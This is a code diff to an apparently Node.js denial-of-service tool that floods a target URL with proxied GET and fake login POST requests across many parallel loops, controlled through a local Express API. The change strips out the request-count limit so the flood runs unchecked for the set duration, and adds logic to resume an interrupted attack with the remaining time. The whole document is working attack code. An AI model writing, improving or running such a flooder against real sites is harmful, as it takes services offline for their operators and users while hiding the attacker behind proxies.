@@ -120,7 +120,7 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
+const performAttack = (url, agent, continueAttack) => {
     if (!continueAttack) return;
 
     const headersForRequest = {
@@ -164,15 +164,11 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
     axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
         state: fakeState()
     })
-    .then((response) => {
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    .then(() => {
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
     })
-    .catch((err) => {
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    .catch(() => {
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
     });
 
     axios.get(url,
@@ -181,10 +177,8 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
             headers: headersForRequest,
             timeout: 0,
         })
-    .then((response) => {
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    .then(() => {
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
     })
     .catch((err) => {
         if (
@@ -210,9 +204,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         } else {
           //  console.log(rainbow(err.message || "ATTACK FAILED!"));
         }
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+        setTimeout(() => performAttack(url, agent, continueAttack), 0);
     });
 };
 
@@ -237,17 +229,11 @@ const startAttack = (url, durationHours) => {
     continueAttack = true;
     targetUrl = url;
     startTime = Date.now();
-    duration = durationHours * 60 * 60 * 1000;
+    duration = durationHours * 60 * 60 * 1000; // convert hours to milliseconds
+
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
     }, duration);
-
-    const checkCompletion = (sentRequests) => {
-        if (sentRequests >= maxRequests || Date.now() > startTime + duration) {
-            clearTimeout(attackTimeout);
-            continueAttack = false;
-        }
-    };
 
     for (let i = 0; i < numThreads; i++) {
         if (!continueAttack) break;
@@ -258,7 +244,7 @@ const startAttack = (url, durationHours) => {
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
         const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
-        performAttack(url, agent, continueAttack, requestsSent, checkCompletion);
+        performAttack(url, agent, continueAttack);
     }
 };
 
@@ -281,6 +267,9 @@ app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
     if (continueAttack) {
         console.log(rainbow('Resuming previous attack...'));
-        startAttack(targetUrl, duration / (60 * 60 * 1000));
+        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // convert milliseconds back to hours
+        if (remainingDuration > 0) {
+            startAttack(targetUrl, remainingDuration);
+        }
     }
 });
